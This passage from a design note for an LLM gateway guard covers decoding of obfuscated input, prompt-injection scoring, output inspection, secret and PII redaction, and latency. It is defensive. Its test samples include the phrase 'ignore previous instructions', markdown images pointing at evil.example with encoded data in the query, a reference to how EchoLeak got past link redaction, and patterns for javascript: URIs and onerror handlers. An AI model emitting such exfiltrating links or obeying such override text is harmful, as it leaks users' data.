    return v, dlp, dlp.lower().translate(FOLD), flags         # inj_text: 1:1 lower + diacritic fold
```
`decode_variants`: BFS over base64 / hex / percent / entity candidates (pct and entity = runs >= 3); strict decode (`b64decode(validate=True)`, `fromhex`, `unquote_to_bytes`, `html.unescape`); keep only strict-UTF-8 text >= 90 % printable, min length 8 (4 for pct/entity); dedupe by hash; each variant records (kind, depth, encoded-blob span in its parent). Limits `[REC]`: depth 3, 16 variants, 64 KiB decoded per request; any cap hit = `decode_bomb` (.5, BLOCK on tool channels).
Passed `[MEASURED]`: zero-width inside `AKIA...` -> span covers the ZWSP; NFKC `ﬁ` before a key keeps its span exact; tag payload and fullwidth + Cyrillic homoglyphs -> `ignore previous instructions`; Polish text intact in `dlp_text`, folded in `inj_text`, equal length; base64(hex(injection phrase)) -> `base64 d1`, `hex d2`. Findings in a decoded variant map to the whole encoded blob.

### 6.4 Obfuscation as a risk signal `[REC]`
ROT13 gate `[INFERENCE]`: accept `codecs.encode(t, "rot13")` as a variant if `hits(r) >= 3 and hits(t) == 0` (`hits` = tokens from a small EN+PL word list); only for tool_result/rag/tool_meta or when a decode instruction is present.
Weights: tag payload decoded and matching a signature .95; tag/variation-selector payload at all .60; bidi without RTL .50; >= 3 invisibles inside words .40; mixed-script word .35; each decode layer with printable output .15; decoded variant matching a signature = its weight + .20; despaced / de-leeted match .45; rot13 match .50; `decode_bomb` .50. `s = 1 - prod(1 - w_i)` against the channel thresholds of 1.2; benign Polish text raises none (tested).

## 7. Output inspection (LLM, agent, MCP server, tool, API responses)

Stages 1 and 4 run on the response too, plus output-only checks; defaults assume a markdown-rendering UI.

| Finding | Detector | Default |
|---|---|---|
| Credentials (prefix rules, PEM, JWT, DB URL) | 2.1 | REDACT (BLOCK on tool_call) |
| Canary from system prompt/RAG/fake `.env` | exact `CANARY-<hex8>` list | **BLOCK** |
| System-prompt leak, verbatim | 6-word shingle containment vs system prompt `[MEASURED]`: verbatim 86 hits, 8-word quote 8, paraphrase 0, benign 0; 10 KB in 200 us | REDACT run at >= 8 consecutive hits (13+ words), else LOG |
| PII absent from the request | 2.2 + not-in-input check | REDACT |
| Malicious shell in text | 5.1 | WARN text, BLOCK in tool_call |
| XSS `<script>`, `on*=`, `javascript:` | regex + **nh3** | sanitize if rendered as HTML; BLOCK `javascript:`/`on*` |
| Generated malware (reverse shell, ransom note, miner) | YARA-X on fenced code (pipe-to-shell hit, 6 us / 10 KB) | WARN permissive / BLOCK strict |
| Markdown image/link with data in query or foreign host | `MD_IMG`, `MD_REF`, `MD_AUTO`, `HTML_URL` + `judge()` | foreign-host image **BLOCK** (zero-click, EchoLeak [CVE-2025-32711](https://nvd.nist.gov/vuln/detail/CVE-2025-32711)); query >= 24 chars or encoded run REDACT (strip URL, keep text); plain external link LOG |
| `data:`/`javascript:` URI; punycode host; IP-literal host | `JS_URI`; `xn--`; `inet_aton` + `ipaddress` | BLOCK; BLOCK link; public IP REDACT, private/metadata BLOCK |

**Why**: span redaction keeps the answer useful and a live secret is not "maybe"; canaries have zero false positives (01 note DLP-03); text is advice but a tool call executes; auto-fetched images exfiltrate without a click and Microsoft blocks that deterministically ([MSRC](https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks)); a paraphrased prompt leak needs the semantic slice. Source code: LOG (BLOCK with internal marker); dictionaries/EDM: 10 note DLP-06/07.

`[MEASURED]` URL judge, 11 samples: allowlisted logo ALLOW; `![x](https://evil.example/p.png?d=U0VDUkVU)` BLOCK; reference-style `![x][1]` + `[1]: https://evil.example/?q=...` REDACT; metadata-IP `<img>`, `xn--` host, `javascript:`, `data:image/svg+xml`, `onerror` BLOCK; unknown autolink LOG; `http://0x7f.1/` only LOG (fix: `inet_aton`). 52 us / 10 KB. RE2: `MD_IMG = !\[[^\]]{0,200}\]\(\s*<?([^)\s>]{1,1000})`, `MD_REF = (?m)^\s{0,3}\[[^\]]{1,100}\]:\s*<?(\S{1,1000})` (how EchoLeak beat link redaction), `HTML_ON = (?i)<[a-z][^>]{0,200}\son[a-z]{3,20}\s*=`, `JS_URI = (?i)\b(?:javascript|vbscript|data)\s*:\s*[^\s"')]{0,200}`.

## 8. Redaction engine

### 8.1 Span model, merge, placeholders
`Span(start, end, type, detector, score, prio, cs, ce)` in **original** coordinates (`cs/ce` = full-match extent, for streaming). Priority: keys/PEM 100, JWT/DB URL 95, basic-auth URL 90, password assignment 85, card/IBAN 80, PESEL/NIP/ID 70, REGON 60, e-mail 50, phone 40, IP 30, internal host 20. Merge = greedy by (prio, score, length) descending, drop overlapping losers. `[MEASURED]`: in `postgres://admin:S3cr3t@db.corp:5432/app` the password span (95) beats the e-mail-shaped `S3cr3t@db.corp` (50).
Placeholders: `typed` `[REDACTED_AWS_KEY]` (default, irreversible); `numbered` `[EMAIL_1]` (same value = same number per session, reversible via vault). Audit: `{type, start, end, len, sha256_8, score}` only.

### 8.2 Worked example
```python
>>> scan_and_redact("My AWS key is AKIAIOSFODNN7EXAMPLE")
('My AWS key is [REDACTED_AWS_KEY]', [{'type': 'AWS_ACCESS_KEY_ID', 'start': 14, 'end': 34, 'sha256_8': '1a5d44a2', 'score': 0.9}], {...})
>>> scan_and_redact("key AK\u200bIAIOSFODNN7EXAMPLE ok")[0]      # zero-width space inside the key
'key [REDACTED_AWS_KEY] ok'
```

### 8.3 Reversible pseudonymization vault
`REVERSIBLE = {EMAIL, PHONE_*, PL_PESEL, PL_NIP, PL_ID_CARD, IBAN, CREDIT_CARD, IPV4/6, INTERNAL_HOST}`; `Vault` is session-scoped, memory-only, TTL 900 s: `ph(sid, type, value)` returns `[EMAIL_1]`; `restore(sid, text)` = `re.sub(r"\[[A-Z0-9]+(?:_[A-Z0-9]+)*_\d+\]", lookup(sid), text)`. Flow: user text -> `numbered` redaction -> LLM sees placeholders only -> **output inspection** -> `restore` -> user. Tested: `[EMAIL_1]` restores, `[REDACTED_AWS_KEY]` stays, another session id restores nothing.
Risks `[INFERENCE]`: secrets never reversible, nothing stored; the vault is a plaintext PII store (memory, TTL, never logged); restore after output scanning, only into the user channel, never into tool-call arguments unless that tool is allowlisted for the type; attacker text containing `[EMAIL_1]` must not restore across sessions; models reformat/split placeholders (misses harmless, partial restores not: hold them back in streams); pseudonymised data is still personal data (GDPR Art. 4(5)).

### 8.4 JSON-aware redaction (tested)
`redact_json(o, fn)`: recurse lists/dicts, apply `fn` to **string leaves only** (keys, numbers, bools untouched); tool calls: parse `arguments` (a JSON string), redact, `json.dumps(..., ensure_ascii=False)`, on `JSONDecodeError` redact at text level; message content is str or `parts[type=text]`.
Placeholders are `[A-Z0-9_]` only, so JSON stays valid. `[MEASURED]`: `{"to":"x@evil.example","body":"pw: AKIA...","n":44051401458,"nested":{"l":["PESEL 44051401458"]}}` -> e-mail, key, nested PESEL redacted; numeric leaf untouched. A number cannot hold a placeholder without changing type: `numeric_pii: block|log` (BLOCK on tool_call).

### 8.5 Streaming with hold-back (tested)
Sent bytes cannot be retracted (agentgateway documents `mask` as unavailable on streams, 02 note), so hold the unfinished tail: (a) cut only at whitespace; (b) never inside a detected span's full-match extent `cs..ce`; (c) digit in the last 48 chars -> hold 48 (IBAN 34 + 7 spaces, card 19 + 4); (d) pending `(password|secret|token|api_key)[:=]\s*\S*$` holds from the keyword; (e) open `-----BEGIN ... PRIVATE KEY-----` holds to the END footer or 8 KiB; (f) `flush()` at the end. `feed(delta)`: append, find the safe end, return `scan_redact(buf[:e])`.
`[MEASURED]`: output equals one-shot redaction for 900 random chunkings (1-40 chars) of three texts (key + e-mail + spaced IBAN + card; password assignment + PEM; benign); benign text held at most 17 chars; naive versions failed until (b), (d), (e) existed. **Not blocking the whole response**: REDACT findings are replaced inline; a BLOCK-type finding mid-stream becomes a span redaction (`stream_block: redact_span`) or ends the stream with `finish_reason: "content_filter"` after the clean prefix; only canaries and exfil URLs justify aborting.

## 9. Latency budget and implementation advice

`[MEASURED]` p50 per part (p95 within ~1.2x), one core:

| Layer | 1 KB | 10 KB |
|---|---|---|
| 1 `build_views` (ASCII code / Polish prose / obfuscated) / `decode_variants` | - / 0.05 ms | 0.07 / 0.24 / 0.70 ms / 0.54-0.67 ms |
| 3 YARA-X / URL+markup judge / sqlglot / tree-sitter | - | 0.006 / 0.05 / 0.10 / 0.013 ms (last two per call) |
| 4 own catalogue + validators (`scan_spans` incl. views, merge, offsets) | 0.3-0.8 ms | 0.6-1.1 ms (obfuscated text 3.6 ms) |
| 4 gitleaks 221 rules via keyword prefilter + RE2 | 0.013 ms | 0.19 ms |
| 4 entropy pass / phonenumbers (after a regex hit) | 0.011 / 0.04 ms | 0.18 / 1.0 ms |
| 5 injection AC, 1000 keywords | 0.006 ms | 0.06 ms |
| 7 leak check (6-gram) / nh3 | - | 0.20 / 0.26 ms |
| **Deterministic total `[INFERENCE]`** (semantic stage excluded: 100-500 ms, other slice) | **~1 ms** | **~3-4 ms** (< 5 ms p95 target of the 01 note) |

1. **Compile once per policy version** into an immutable `RuleSet` (RE2 objects, AC automaton, YARA-X rules); atomic swap on hot reload, requests pin their snapshot. Compile: RE2 ms-range, `re2.Set` 0.05 s, Hyperscan 0.7 s, YARA-X ~1 ms/rule.
2. **Single pass multi-pattern**: one AC pass over `inj_text`, one over `dlp_text` (gitleaks keywords), then RE2 only for triggered rules; scan each part once, share views, map spans to the original only for REDACT; caps 256 KB per part, 1000 findings, 16 variants.
3. **No backtracking engine for feed rules**: reject at feed load lookaround, backrefs, repetition > 1000, nested large bounded repeats; set `max_mem`. `regex` with `timeout=` only for internal rules.
4. Per-rule counters/timers (`rule_id, hits, ms`) feed the dashboard; auto-disable a rule with p95 > 2 ms or a benign-corpus block rate above threshold (audit event).

## Inconsistent
| Topic | Side 1 | Side 2 | Choice |
|---|---|---|---|
| Hyperscan licence | GitHub API NOASSERTION | BSD to 5.4, Intel proprietary from 5.5 ([Vectorscan](https://github.com/VectorCamp/vectorscan)) | Vectorscan only |
| `\b` | stdlib: Unicode-aware | RE2: ASCII-only `[MEASURED]` | explicit `[^\pL\pN_]` for Polish |

## Could not establish
- Stripe prefixes from Stripe's own docs (fetch timed out; only gitleaks read). OpenAI, Anthropic, Google, Hugging Face key formats are not vendor-documented; shapes come from gitleaks and may drift.
- Whether `github_pat_` has a checksum; Betterleaks rule-format compatibility; FP/FN rates on real (especially Polish) prompts (only synthetic and metadata corpora run); whether google-re2 releases the GIL; UTS #39 handling of the 405 multi-character prototypes; Magika latency (10 note figure only); atlas.mitre.org page for T0068 returned 404 (ids from 01 note).

## Recommendation for the MVP `[REC]`
1. **Stack**: google-re2 + ahocorasick-rs + YARA-X + sqlglot + tree-sitter-bash + nh3 + phonenumbers. Skip Presidio runtime, detect-secrets, TruffleHog, Hyperscan, bashlex, guesslang, bleach, python-stdnum.
2. **Rules** (4 h): gitleaks TOML -> policy rule schema via a ~40-line converter (regex, keywords, entropy, stopwords); hand-write the 30 catalogue patterns incl. PL identifiers (PESEL + date, NIP, REGON, ID card, NRB, IBAN trim), vectors of 2.3 as unit tests.
3. **Normalization** (3 h): `View`, `build_views`, `decode_variants`. **Redaction** (4 h): merge, typed placeholders, JSON-aware, vault, streaming hold-back + the 900-chunking test. **Injection** (3 h): signature AC + noisy-OR, channel thresholds (1.2), signals (6.4). **Output** (3 h): canary, 6-gram leak check, URL/markup judge, nh3, YARA-X.
4. **Defaults**: REDACT secrets/PII in chat, BLOCK secrets in tool calls and foreign auto-fetched images, REQUIRE_APPROVAL for destructive SQL/shell, entropy alone never acts, GitHub CRC on, AWS doc sample stays detectable. Target < 5 ms p95 for 10 KB (measured sum ~3-4 ms).
5. **Cut first**: variation-selector payload decoding, ROT13/Caesar beyond the common-word test, Magika, Presidio NER bridge, entropy tuning, Hyperscan, `re2.Set`, vault restore into tool arguments.
6. **Tests to ship**: vectors of 2.3, offset round-trip (zero-width/NFKC), base64->hex decode, tag smuggling, benign Polish text, stream equivalence, markdown-exfil variants, SQL no-WHERE, shell pipe-to-sh, a ReDoS payload against a feed rule.
